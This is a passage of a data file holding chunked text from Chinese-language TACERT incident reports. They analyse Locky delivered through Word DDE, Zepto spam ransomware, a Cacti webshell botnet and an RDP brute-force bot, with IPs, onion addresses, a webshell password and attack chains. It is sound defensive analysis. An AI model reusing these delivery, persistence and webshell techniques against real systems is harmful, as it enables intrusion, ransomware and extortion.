https://www.zscaler.com/blogs/security-research/hijackloader-updates#indicators -of-compromise--iocs- ",
        "Page_Num": "9,10"
    },
    "558": {
        "File_Name": "個案分析-透過DDE攻擊的無檔案式Locky變種病毒事件分析報告.pdf",
        "content": "個案分析- 利用DDE 散播Locky 病毒 的Word 文檔事件分析報告 臺灣學術網路危機處理中心團隊(TACERT)製 106 年12 月  1 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team I. 事件簡介 1. 在2017 年10 月有愈來愈多的駭客濫用微軟Windows 中的動態資料交換 (Dynamic Data Exchange,DDE)協定來散布惡意程式。 2. DDE 協定是微軟Windows 與Office 中用來於不同程式中交換資料的協定之 一,它可在共享資料的程式間傳遞訊息,並藉由共享記憶體交換資料。 3. 勒索病毒的家族繁多,其中一個著名勒索病毒家族Locky 勒索病毒,在2017 年9 月產生一個新的以「.YKCOL」為副檔名的Locky 變種病毒。 4. 在2017 年10 月發生Locky 變種病毒透過DDE 協定散播的事件,為了瞭解其 攻擊與感染過程,本中心在取得樣本後進行分析。 II. 事件檢測 1. 使用3 台Windows 7 的VM 虛擬主機進行隔離環境測試,並且設定一些網路共 用資料夾與網路磁碟機,詳細內容如下圖所示。 本案檢測的三個主機所代表的角色分別敘述如下:  2 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team (1)WEB Server:為含有惡意程式Virus.exe 的網站伺服器,觀察受害主機是 否會連至網站伺服器下載惡意程式。另外,因為它與受害主機是同一個網 域,我們也安排一個網路共用資料夾WebDoc,觀察看看受害主機中毒後是 否會感染它。 (2)DDE-PC:為受害主機,會收到含有Word1.docx 的郵件,設定一個從同一 區域網路連過來的AMY-PC 下的FileDoc 網路共用資料夾為網路磁碟機Z, 並觀察在有設定網路磁碟機的狀況下病毒擴散之情形。 (3)AMY-PC:與DDE-PC 為同一個區域網路的主機,此主機上有兩個網路共享資",
        "Page_Num": "1,2,3"
    },
    "559": {
        "File_Name": "個案分析-透過DDE攻擊的無檔案式Locky變種病毒事件分析報告.pdf",
        "content": "料夾,其中一個FileDoc 為DDE-PC 的網路磁碟機資料夾,另一個ShareDoc 為一般網路共用資料夾。 2. 開啟含有DDE 的Word1.docx 檔案後,依序出現三個訊息視窗,在點選2 次「是」 與「確定」後即關閉視窗,並且看到Word 檔的內文,同時在桌面上出現一個 virus.exe 執行檔。 下面表格為針對三個訊息視窗的按鈕選擇所可能產生的程式執行結果。  3 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team No 第一個訊息 第二個訊息 第三個訊息 結果 1 否 - - 看到Word 內文 2 是 否 確定 看到Word 內文 3 是 是 (下載惡意程式) 確定 下載惡意程式與 看到Word 內文 3. 檢視Word1.docx 內文,發現Word 的功能變數(Field)設定有嵌入DDE,而 且會在文件開啟時自動執行,駭客可用它來開啟命令提示,並且連至某網站 下載與執行惡意程式。 4. 在Word1.docx 開啟後不久,出現一些加密檔案,會開啟一個ykcol.htm 網頁 與一個ykcol.bmp 圖檔,並且ykcol.bmp 圖檔也變成電腦桌布,最後原先桌 面virus.exe 檔案消失,可見程式virus.exe 具有自我毀滅機制,能讓受害 者找不到它的存在。  4 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 5. 查看ykcol.htm 內容,發現內容為告訴受害者如何取得解密金鑰的資訊,駭 客提供受害者一個個人識別ID:7JMR8YXXA0IUD4UN,請受害者下載並安裝Tor 瀏覽器,之後在瀏覽器上打網址: g46mbrrzpfszonuk.onion/ 7JMR8YXXA0IUD4UN 即可看到訊息。 6. 透過Tor 瀏覽器,我們可以得知駭客告訴受害者購買比特幣的管道有哪些, 受害者需支付0.25 個比特幣到駭客所提供的比特幣地址內,經比特",
        "Page_Num": "3,4,5"
    },
    "560": {
        "File_Name": "個案分析-透過DDE攻擊的無檔案式Locky變種病毒事件分析報告.pdf",
        "content": "幣交易被  5 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 確認後,受害者會被重新導向解密金鑰下載頁面。另外,比較10 月、11 月 中旬與11 月底三次檢測發現,駭客要求受害者支付的比特幣從原先的0.25 個降為0.2 個,又在半個月後升回0.25 個比特幣,可見駭客隨時會調整要求 受害者給付的比特幣數量。 7. 查看檔案被加密的情形,發現在每個被加密的檔案資料夾中會有一個以 「ykcol-4 位英文字母與數字混合.htm」命名的網頁檔,而被加密的檔案名 稱皆為「受害者識別ID-8 位英文字母與數字混合-12 位英文字母與數字混 合.ykcol」,也發現在網路磁碟機Z 內的檔案都被加密,但C:\\windows 與 C:\\program files 內檔案沒有被加密的情形。  6 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 8. 檢視背景程式運作情形,發現在開啟Word1.docx 檔案後,陸續呼叫cmd.exe、 certutil.exe、virus.exe、chrome.exe 與cmd.exe 等程式。 (1)當cmd.exe 執行後,會呼叫certutil.exe。 (2)當certutil.exe 執行後,會連至網站下載惡意程式virus.exe。 (3)當執行virus.exe 後,受害主機內的檔案開始被加密。 (4)當Chrome.exe 執行時,表示已完成受害主機內檔案的加密作業,接者會 開啟ykcol.htm 來告訴受害者檔案已被加密與如何下載安裝Tor 瀏覽器來取 得付款資訊。  7 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team (5)最後當執行cmd.exe 時,表示此時惡意程式在完成檔案加密作業後會刪除 自己本身,並且刪除temp 資料夾內的tmp 檔資訊。 9. 透過Virustotal 網站檢測Word1.docx,偵測率為19/60,可見其不容易被大 多數的防毒軟體檢測出來,",
        "Page_Num": "5,6,7,8"
    },
    "561": {
        "File_Name": "個案分析-透過DDE攻擊的無檔案式Locky變種病毒事件分析報告.pdf",
        "content": "而且有多家防毒軟體公司判定它為DDE 的 Downloader(下載器)。 10. 將virus.exe 送至Virustotal 網站檢測,偵測率為61/65,可見其惡意比 例相當高,而且多家知名防毒軟體公司判定它為Locky 勒索病毒的變種。  8 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 11. 將ykcol.htm 與被加密的檔案上傳至勒索病毒辨別網站 (https://id-ransomware.malwarehunterteam.com), 檢測結果為Locky 勒 索病毒,目前此病毒沒有解密檔案的方式,只能將被加密的檔案備份,等未 來有解密方式時才解密。 12. 從封包內容檢視,觀察到惡意程式執行後會對內部網路進行 139 port 與445 port 的掃描,並嘗試針對能夠存取的共享資料夾進行加密,若有連接網路磁 碟機或 NAS 就有可能所儲存的檔案遭受到破壞。  9 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 13. 檢視封包內容,發現受害主機連到網站下載virus.exe 的資訊。 14. 檢視封包內容,發現惡意程式將網路磁碟機Z 內檔案加密後更改檔案名稱的 資訊。  10 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 15. 查看Web Sever 與AMY-PC 內的網路共享資料夾,發現Web Sever 沒有任何 感染情形,但是AMY-PC 內的兩個網路共用資料夾內檔案皆都被加密,可見只 要受害主機有存在網路磁碟機的連線,則惡意程式會透過此連線加密連線另 一方電腦內共用資料夾內的檔案。 III. 網路架構圖  11 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 1. 駭客傳送惡意Mail(含DDE Word 檔)給受害者。 2. 受害者開啟Mail 附件Word 檔。 3. 受害主機連至含有惡意程式的Web 伺服器下載惡意程式。 4. 受害主機自動執行惡意程式。 5. 受害主機進行",
        "Page_Num": "8,9,10,11,12"
    },
    "562": {
        "File_Name": "個案分析-透過DDE攻擊的無檔案式Locky變種病毒事件分析報告.pdf",
        "content": "檔案加密。 6. 惡意程式執行完畢後自我刪除。 IV. 建議與總結 1. 惡意程式透過DDE 協定來散播的途徑非常容易,只要開啟一個Word 檔將 DDEAUTO 的語法打入後存檔即完成含惡意程式的Word檔,之後再以E-mail 方式寄出即可。 2. 利用DDEATUO 的語法,駭客可以隨時更換惡意程式的下載路徑與更改惡意 程式的內容,惡意程式可以為其他的勒索病毒或者為一個挖礦程式。 3. 含有DDE 的Word 檔在開啟後所出現的訊息視窗內容,如同系統本身訊息 提示,讓使用者不易察覺有異。 4. 起先微軟公司雖了解此風險的存在,但認為DDE 的問題在技術上並不代表 一個錯誤,而是一個程式本身的功能。隨著利用DDE 技術被大肆濫用,微 軟的安全團隊慢慢開始改變主意。目前微軟在10 月中旬與12 月中旬陸續 發表了4053440 安全通報(Security Advisory)與Office 防禦深度更新 ADV170021,以協助使用者減輕DDE 攻擊所帶來的威脅。 (1)微軟安全通報 4053440 告訴使用者如何安全地打開包含動態數據交換(DDE)字段的Microsoft Office 文檔,通過GUI 選項或Windows 註冊表修改禁用DDE 支持的方法。 https://technet.microsoft.com/en-us/library/security/4053440 (2)Office 防禦深度更新ADV170021  12 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 針對微軟Office 的更新,提供了增強的安全性作為一種縱深防禦措施。 此更新禁用Microsoft Word 的所有受支持版本中的動態更新交換協議 (DDE)。 https://portal.msrc.microsoft.com/en-US/security-guidance/advis ory/ADV170021 5. 為了有效預防此類型攻擊事件,建議使用者不要開啟來路不明的郵件附加 檔案。 6. 使用者可以利用「Word 選項>進階>一般>不勾選「開啟舊檔時自動更新連 結」選項」來關閉每次Word 檔",
        "Page_Num": "12,13"
    },
    "563": {
        "File_Name": "個案分析-透過DDE攻擊的無檔案式Locky變種病毒事件分析報告.pdf",
        "content": "開啟時出現的DDE 訊息視窗。 7. 使用者可利用登錄編輯程式手動關閉各種Office 版本與程式的DDE功能。 8. 建議使用者平時備份重要檔案,一旦感染惡意程式時,除使用防毒軟體掃 毒外,對於無法被解密的檔案,可以先行備分,以等待未來新的解密程式 產生時進行解密。  13 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team V. 相關報導 1. Locky Ransomware Spam Infects via Microsoft Office https://www.bankinfosecurity.com/locky-ransomware-spam-infects-via-mi crosoft-office-a-10392 2. Locky Ransomware Attacks Exploit Microsoft DDE to Increase Effectiveness https://securityintelligence.com/news/locky-ransomware-attacks-exploi t-microsoft-dde-to-increase-effectiveness/  14 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 3.空白Word 暗藏木馬,俄國駭客組織用微軟DDE 協定攻擊散佈惡意 程式 https://www.ithome.com.tw/news/118203 4.Microsoft Disables DDE Feature in Word to Prevent Further Malware Attacks https://www.bleepingcomputer.com/news/microsoft/microsoft-disables -dde-feature-in-word-to-prevent-further-malware-attacks/ ",
        "Page_Num": "13,14,15"
    },
    "564": {
        "File_Name": "個案分析-透過SPAM郵件入侵的Zepto勒索病毒_10509.pdf",
        "content": "個案分析- 會透過SPAM 郵件入侵的 Zepto 勒索病毒事件分析報 告 臺灣學術網路危機處理中心團隊(TACERT)製 2016/9  1 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team I. 事件簡介 1. 近年因為虛擬貨幣越來越普及,順勢助長了加密勒索病毒盛行,台灣的受 害單位更不計其數,企業、政府或醫院都深受其害。 2. 除了一般企業會遭受加密勒索病毒攻擊,政府單位或學術單位也成為被攻 擊的對象,很多都是透過瀏覽器漏洞或SPAM 郵件感染。 3. 此類加密勒索共同點都是以比特幣為贖金的支付方式,因為比特幣的匿名 性可以輕易規避金流追查,更成為犯罪組織喜愛的使用方式。 4. 此例為社交工程SPAM 郵件攻擊,多以帳單或設備文件檢查為主旨,並夾 帶zip 的病毒檔案。 II. 事件檢測 1. 使用VM 虛擬主機並且為Windows 7(32 bit)系統進行隔離環境測試。 2. 惡意程式zip 解壓縮之後會有三個附檔名為 js 的檔案,雖然並非常見的 exe 執行檔,js 事實上是用javascript 撰寫的執行檔案。 3. 透過Virustotal 線上掃毒,該二個JS 執行檔病毒的檢測比例 9/56,為 Locky 家族變種的加密勒索軟體,且偵測比例不算太高。  2 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 4. 首先執行js 的檔案,系統會使用系統程式Wscript.exe 去執行java script。 5. 透過procexp 工具查看背景程式執行狀態,可以看到WScript.exe 會呼叫 rundll32.exe,建立並執行位於 C:\\~\\local\\temp\\ 的惡意程式 7pFonKtg7.dll。  3 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 6. 透過Virustotal 掃描該DLL 檔案,確認該檔案為偵測比例 40/58 的惡意 程式,並被幾家防毒廠商判定為ran",
        "Page_Num": "1,2,3,4"
    },
    "565": {
        "File_Name": "個案分析-透過SPAM郵件入侵的Zepto勒索病毒_10509.pdf",
        "content": "somware。 7. 惡意程式最主要的行為之一就是會有對外的網路連線產生,因此查看程式 rundll32.exe 的網路狀態可以發現,確實有正在對外部 91.211.119.71:http 的網路連線,該IP 位址位於UA 的國家烏克蘭。  4 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 8. 使用Cports 查看所有網路連線狀態,也能觀察到該程式除了有對外IP 建立連線,也會針對內部網段其他IP 進行scan 動作,判斷為找尋可存取 的網路檔案進行檔案加密。 9. 當所有磁碟內部或外部的關聯檔案都被加密後,在桌面會跳出一個圖片檔 「_HELP_instructions.bmp」以及一個「_HELP_instructions.html」說 明檔,主要內容是引導後害者如何進行繳付勒索贖金,此時發現所有可開 啟文件都已經無法開啟。  5 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 10. 此時隨意開啟資料夾查看原有文件檔,發現所有文件檔的確檔案名稱都 被置換為主機識別ID 及編碼,而副檔名改為 zepto,為locky 病毒的變 種型。 11. 根據引導說明檔的內容操作,勒索的網址必須透過 Tor 的匿名網路瀏 覽器去開啟,無法使用一般DNS 解析出正常IP,而這是駭客很常用來規 避IP 追蹤的方法之一。  6 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 12. 此例開啟特殊onion 網域位址後看到至少經過三次的Relay IP,才轉 跳至未知的目的地 onion site。 13. 透過 Tor 瀏覽器成功開啟網址後,出現的是簡體中文的 Locky Decryptor 網頁,意思是受害者必須向該網站購買解密的金鑰程式,才能 還原被加密過的檔案,並且必須透過以比特幣作為支付方式,將0.5 BTC 付款至指定位址,大約是新台幣10000 元 。 14. 駭客為了希望能夠提高成功率,還特地引導教學受害者如何購買取得比 特",
        "Page_Num": "4,5,6,7"
    },
    "566": {
        "File_Name": "個案分析-透過SPAM郵件入侵的Zepto勒索病毒_10509.pdf",
        "content": "幣,根據受害者所在國家不同也有不同的取得方式。  7 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 15. 因為比特幣的錢包地址具有完整的匿名性及不可被否認性,一旦支付出 去就無法追討回來,也無法知道帳號擁有者身分,所以比特幣成為犯罪組 織最愛的交易工具。 16. 從網路封包中可以看到,主機感染惡意程式後 WScript.exe 會先連到 美國的中繼站網址「malwinstall.wang」,並且透過 HTTP GET 方式下載 165KB 檔案 ezr08tjd ,判斷為加密用的公鑰。  8 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 17. 解析網域名稱 malwinstall.wang 後得知該網域有兩個正解IP 為 107.173.176.4 和 23.95.106.220,網站畫面只有簡單的LOGO,判斷用 來提供感染主機存取加密公鑰。 18. 當主機檔案被加密完成後,惡意程式7pFonKtg7.dll 透過 rundll32.exe 開始向烏克蘭的C&C 91.211.119.71 進行連線,並使用 HTTP POST 方式上傳 urlencoded 的加密內容至 /data/info.php,研判  9 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 為解密所需的私鑰。 19. 當主機向上層C&C 送出私鑰後,惡意程式開始對內部區域網路進行 netbios 的存取,並嘗試針對能夠存取的共享資料夾進行加密,若有連接 網路磁碟或NAS 就有可能遭受破壞。  10 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team III. 網路架構圖 受害者 檔案被加密勒索 SPAM 郵件 Javascript 檔案 中繼站 Malwinstall.wang:80 駭客 STEP 1 感染惡意程式 美國-中繼主機 38.229.70.61 STEP 5 Tor Browser 匿名網路 STEP 2 下載加密公鑰 HTTP GET 贖金網站 http://5n7y4yihirccftc5. onion/EC3737B6C31",
        "Page_Num": "7,8,9,10,11"
    },
    "567": {
        "File_Name": "個案分析-透過SPAM郵件入侵的Zepto勒索病毒_10509.pdf",
        "content": "BE444 STEP 5 支付Bitcoin 0.5BTC STEP 6 接收Bitcoin STEP 7.1 解密私鑰贖回 持續監控 同網段主機 共享資料夾 STEP 4 Netbios Scan 加密存取檔案 發送SPAM郵件 STEP 7.2 解開加密檔案 ?? 烏克蘭.C&C 91.211.119.71:80 STEP 3 回傳解密私鑰 HTTP POST 1. 使用者透過SPAM 郵件攻擊感染Zepto 的加密勒索病毒。 2. 主機感染後先向中繼站下載加密用的公鑰。 3. 主機向烏克蘭的C&C 主機回傳加密的私鑰。 4. 感染主機開始向同網段的共享資料夾掃描存取並且加密檔案。 5. 受害者必須透過Tor Browser 使用中繼主機進入匿名網路。 6. 開啟了贖金網站,若是選擇付款則需要用Bitcoin 支付0.5BTC。 7. 駭客收到Bitcoin 贖金後理論上會將解密私鑰Decryptor 給受害者。 8. 受害者利用解密私鑰Decryptor 進行解密並有可能還原檔案。 IV. 建議與總結 1. 使用者透過SPAM 郵件遭受感染Locky 的變種Zepto 加密勒索病毒。 2. 主機一旦被感染後,惡意程式會開始加密本機磁碟和網路資料夾中的文件 檔、圖片檔和影音檔案。 3. 惡意程式隨後會跳出網頁和文件資訊,引導受害者如何去支付贖金來取得  11 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 解密私鑰。 4. Zepto 病毒號稱使用RSA-2048 和AES-128 加密,因為沒有私鑰基本上是 無法救回檔案,建議使用者要定期備份重要資料避免無法挽回。 5. 理論上付了贖金給駭客,取得解密私鑰及工具就能解開,然而也無法保證 能成功救回檔案,可能導致檔案遺失又損失金錢。 6. 目前該 Zepto 病毒尚未有防毒軟體廠商製作出免費的解密工具。 7. 此病毒主要透過SPAM 郵件感染,有別於傳統的EXE 檔案,務必安裝防毒 軟體",
        "Page_Num": "11,12"
    },
    "568": {
        "File_Name": "個案分析-透過SPAM郵件入侵的Zepto勒索病毒_10509.pdf",
        "content": "多能偵測抵擋此類病毒攻擊。 ",
        "Page_Num": "12"
    },
    "569": {
        "File_Name": "個案分析-透過網站漏洞入侵的殭屍電腦事件分析報告_10506.pdf",
        "content": "個案分析- 透過網站漏洞入侵的殭屍電 腦事件分析報告 TACERT 臺灣學術網路危機處理中心團隊製 2016/6  1 I. 事件簡介 1. 近期協助處理某單位被開立資安事件單的主機,該主機被偵測遭受弱點入 侵成為殭屍主機,可能會接受C&C 指令對外發動攻擊。 2. 該主機資訊為 Centos 的Linux 作業系統,主要功能為Web server 有安 裝Apache 套件,以及網路流量管理程式 Cacti。 3. 主機預設有開啟 port 22 的SSH 服務,供管理者以root 權限登入使用, 並且有設定防火牆限制只有特定網段能夠存取。 4. 我們使用指令tcpdump 去側錄該主機的網路流量封包進行分析駭客可能 入侵的方式。 II. 事件檢測 1. 首先受入侵的主機通常會有異常網路連線,因此透過指令 nestat 去檢查 連線狀態,確實出現可疑的連線。 2. 受害主機會固定向韓國IP 121.126.31.78 的port 2066 進行連線動作, 初步判定此IP 可能是中繼站或C&C 主機。 3. 從封包資料中發現,受害主機的確會持續向韓國IP 121.126.31.78 發送 134B 的封包回報主機狀態。  2 4. 此外也會觀察到有的封包內容含有其他主機的IP 資訊,如114.55.36.222 和23.234.5.22。 5. 查找與114.55.36.222 和23.234.5.22 封包紀錄發現,受感染主機會向以 上IP 主機port 80 發送696B 左右的TCP SYN 封包,進行所謂的SYN Flood 的DDoS 攻擊。 6. 除此之外透過netstat 也得知此程式的名稱為 2066 以及他的PID 資訊, 透過指令 pstree 可以看到該程式會同時開啟8 個子程序進行對外連線。  3 7. 透過指令 find 找出2066 木馬程式藏匿於 /etc/2066,約為1.2MB 左右 大小的執行檔,其權限為root 所有。 8. 因為主機重開機後該惡",
        "Page_Num": "1,2,3,4"
    },
    "570": {
        "File_Name": "個案分析-透過網站漏洞入侵的殭屍電腦事件分析報告_10506.pdf",
        "content": "意程式會自動執行,故研判應該有寫入自動啟用的 腳本中,檢查自動啟動區 /etc/rc.d/init.d/ 和 /etc/rc.d/rc1.d/確實 有惡意程式的連結 DbSecuritySpt,其內容為呼叫 /etc/2066 惡意程式。 9. 找到惡意程式2066 的位置和PID 後,嘗試kill PID 以及刪除檔案2066 觀察,發現過一會惡意程式又會自動復原並且執行,因此推斷有其他監控 程式 watchdog 才是源頭。 10. 透過PS 指令追查發現在 /usr/bin/ 底下找到兩支隱藏檔,分別為 “.ssh.hmac”和“.sshd”,經測試發現“.sshd 和2066”會互相還原對 方,而“.ssh.hmac”會還原“.sshd”,故如要完全中止清除檔案必須移 除以上三支程式方可完成。 11. 接著我們透過系統的LOG 去追蹤駭客可能的入侵方式,因為管理者有設置 防火牆的登入規則,故SSH 登入只限定校內IP,並且檢查security log 確實也查無異狀。  4 12. 剩下唯一可能入侵方式就是透過HTTP 的漏洞登入,雖然該主機有安裝資 料庫管理套件 PhpMyAdmin,然而可能的漏洞 setup.php 早已移除,故許 多駭客嘗試透過此漏洞入侵都沒有成功。 13. 檢查側錄封包紀錄,發現到有中國IP 222.67.15.138 成功存取過 /cacti/plugins/weathermap/configs/test.php,其封包內容透過base 64 解碼後,確實為執行伺服器bash 指令 netstat 並回傳C&C。 14. 透過 base64 decoder 將內容解碼,駭客執行了bash 指令cd、netstat、 pwd、echo 等指令。  5 15. 另外從封包紀錄中發現到可疑的網頁路徑存取,疑似為駭客用來操控主機 的PHP 網頁 hack.php,存取的來源IP 為日本的 203.104.145.39 。 16.",
        "Page_Num": "4,5,6"
    },
    "571": {
        "File_Name": "個案分析-透過網站漏洞入侵的殭屍電腦事件分析報告_10506.pdf",
        "content": "透過此線索追蹤主機內資料夾 .../plugins/weathermap/configs/, 確實 有駭客寫入的 hack.php,其內容包含登入所需要的密碼 9527。  6 17. 實際測試該網頁狀態,輸入密碼9527 後登入可以看到許多網路工具,供 駭客執行shell 指令使用。Hack.php 中此功能可以讓駭客隨意新增刪除 PHP 文件。 18. Hack.php 中此選項可以用來進字典暴力破解攻擊,針對SSH、FTP 或其他 協定。  7 19. Hack.php 中此選項可以用來對外部主機進行通訊埠號的掃描,為入侵之 前的準備。因為介面都是簡體中文,推測此駭客應為中國人。 20. 透過以上紀錄去推斷,駭客應該是透過cacti 漏洞test.php 執行shell 並寫入hack.php 的專用工具,進行內部植入木馬程式2066 和.sshd,或 者接收駭客指令對外攻擊。 III. 網路架構圖  8 C&C主機 韓國 121.12.31.78:2066 Web server Cacti 軟體服務 駭客端 中國 222.67.15.138 STEP 2 HTTP定期回報 Port 2066 114.55.36.222 23.234.5.2 ... STEP 4 TCP SYN Flood DDoS 控制C&C C&C主機 日本 203.104.145.39 STEP 3 登入 hack.php 執行Shell 指令 STEP 1 HTTP 漏洞 test.php 控制C&C STEP 5 SSH暴力破解等 其他攻擊 1. 駭客透過HTTP 網站漏洞 test.php 入侵並植入 hack.php 和2066 等惡意程 式。 2. 惡意程式2066 和.sshd 會定期回報IP 或其他資訊給韓國C&C 主機。 3. 駭客透過日本C&C 主機登入 hack.php 去執行攻擊指令。 4. 受害主機收到C&C 指令後去對其他外部主機進行TCP 的SYN Flood 攻擊。 5. 受害主機也可能接收其他指令對外部主機進行SSH 暴力破解或其他攻擊。 IV. 建議與總結 1. 此個案駭客主要是透過套裝",
        "Page_Num": "6,7,8,9"
    },
    "572": {
        "File_Name": "個案分析-透過網站漏洞入侵的殭屍電腦事件分析報告_10506.pdf",
        "content": "軟體cacti 的test.php 漏洞入侵植入惡意程 式。 2. 此漏洞test.php 類似於 PhpMyadmin 的 setup.php 漏洞,能讓駭客寫入 新的php 去執行shell 指令。 3. 惡意程式 2066 和 .sshd 互為看門狗程式,會互相修復被刪除掉的一方 並重新執行。 4. 惡意程式2066 會寫入開機啟動流程中DbSecuritySpt,確保重開機後能  9 持續執行。 5. 駭客透過hack.php 來執行主機的shell 指令,可以用來對外部主機進行 TCP SYN Flood 的DDoS 攻擊或者其他類型攻擊。 6. 要徹底解決感染主機,首先要先修補HTTP 漏洞刪除test.php 和 hack.php,接著移除惡意程式 2066 以及 .sshd 的看門狗程式即可。 7. 建議管理者檢查安裝的HTTP 套件是否有類似的PHP 檔案,避免成為駭客 入侵的管道之一。 ",
        "Page_Num": "9,10"
    },
    "573": {
        "File_Name": "個案分析-遠端桌面RDP入侵與攻擊的殭屍主機事件分析報告_10602.pdf",
        "content": "個案分析- 遠端桌面 RDP 入侵與攻擊 的殭屍主機事件分析報告 臺灣學術網路危機處理中心團隊(TACERT)製 106 年2 月  1 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team I. 事件簡介 1. 該資安事件為某主機對外部其他主機進行大量的RDP 暴力破解攻擊,造成 網路頻寬壅塞及主機效能降低。 2. 該主機為系所研究室學生使用的個人電腦,並且使用Win7(x64)的作業系 統。 3. 經檢測主機並無安裝任何防毒軟體,並且有啟用系統的遠端桌面服務,然 而卻無限制來源端網段連入。 4. 該主機所使用的帳號密碼皆為相同,並且為簡易型的三個英文字元作為帳 密。 II. 事件檢測 1. 首先將裝有檢測工具的隨身碟插入該主機,並執行工具軟體準備檢測,然 而隨身碟資料夾中的執行檔工具卻被開始進行加密,所有檔案名稱都被置 換成『檔案名稱.[makedonskiy@india.com].wallet』。 2. 在隨身碟資料尚未被加密完全前,就立刻拔除隨身碟強迫中斷加密動作, 加密後的檔名中包含了駭客的email 位址,可能要透過它來勒索解密贖 金。  2 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 3. 雖然加密病毒會對隨身碟進行加密,但主機內資料卻不受影響。在系統內 執行TCPview 工具觀察,有一支名為 rundll32.exe 正在大量進行對外 RDP 暴力破解攻擊。 4. 開啟Procexp 工具檢查系統背景程式狀況,可以清楚看到 rundll32.exe 所執行的惡意程式為 target.dll,此為RDP 攻擊的主要檔案。 5. 從rundll32.exe 的連線狀態來看也能確定其網路攻擊為RDP connection  3 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team brute force。 6. 將位於隱藏資料夾中的 \\AppData\\Roaming\\target.dll 透過 Virustotal 進行掃描分析,檢測偵測比例為",
        "Page_Num": "1,2,3,4"
    },
    "574": {
        "File_Name": "個案分析-遠端桌面RDP入侵與攻擊的殭屍主機事件分析報告_10602.pdf",
        "content": "36/57 的木馬後門程式,接 受駭客指令進行攻擊。 7. 接著透過 autoruns 檢查開機時啟動程序發現,惡意程式 pl.exe 會常駐 在開機啟動區,而pl.exe 與target.dll 相同都是藏匿於隱藏資料夾 \\AppData\\Roaming\\ 之中。  4 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 8. 將 pl.exe 透過virustotal 掃描得知,該程式的病毒檢測比例為 38/58, 判定為啟動 target.dll 做RDP 攻擊的惡意程式,並且可能帶有對插入的 磁碟進行加密動作。 9. 該主機最有可能被入侵方式應該就是遠端桌面RDP 服務,因為使用者常常 發現畫面被登出,表示有駭客正在登入使用。且沒有設定防火牆導致外部 駭客能夠存取到主機,並且使用密碼與帳號相同的弱密碼。 10. 檢查封包連線狀態,可看到主機持續對外做RDP 登入行為,並且都固定使 用帳號ID 為 Natisha 進行嘗試登入。  5 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team III. 網路架構圖 受感染主機 140.X.X.136:3389 駭客 被攻擊主機群 Port 3389 STEP 2 RDP Brute Force Scan STEP 3 Port 3389 持續嘗試RDP登入 STEP 1 Port 3389 RDP 入侵並植入惡意程式 外部主機群 1. 駭客透過RDP 遠端桌面服務入侵受害者主機。 2. 駭客植入惡意程式DLL 並持續對外部主機進行RDP 暴力破解攻擊。 3. 外部其他駭客也可能透過RDP 破解登入受害者主機。 4. 受害主機同時有可能對外部磁碟進行加密勒索。 5. 因為駭客是RDP 登入主機,受害者個人資料可能都已經外洩。 IV. 建議與總結 1. 使用者有開啟遠端桌面RDP 服務,並且都是使用簡易的三個字元的帳號密 碼。 2. 因為並無設定防火牆規則限制來源端連入,故駭客輕易透過遠端桌面服務 入侵到使用者主機。 3. 使用者經查發現",
        "Page_Num": "4,5,6"
    },
    "575": {
        "File_Name": "個案分析-遠端桌面RDP入侵與攻擊的殭屍主機事件分析報告_10602.pdf",
        "content": "到帳號被登出,卻不知道此時駭客正在登入並植入惡意程 式。 4. 駭客植入target.dll 惡意程式並持續對外部網段進行RDP Scan 的暴力破 解攻擊,嚴重消耗主機的CPU 和記憶體資源導致電腦變慢。  6 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 5. 從RDP 封包中固定使用 Natisha 作為登入帳號,來判斷該主機應該只是 用來探索外部主機RDP 服務是否可連線。 6. 惡意程式pl.exe 會再開機時候呼叫target.dll 執行,並且可能會對USB 隨身碟內的資料進行加密勒索,並將加密檔名中放入駭客用的email 位 址。 7. 建議電腦務必安裝防毒軟體,並且可用Teamviewer 方式取代內建的遠端 桌面服務避免被駭客入侵。 ",
        "Page_Num": "6,7"
    },
    "576": {
        "File_Name": "個案分析-釣魚網站(phishing).pdf",
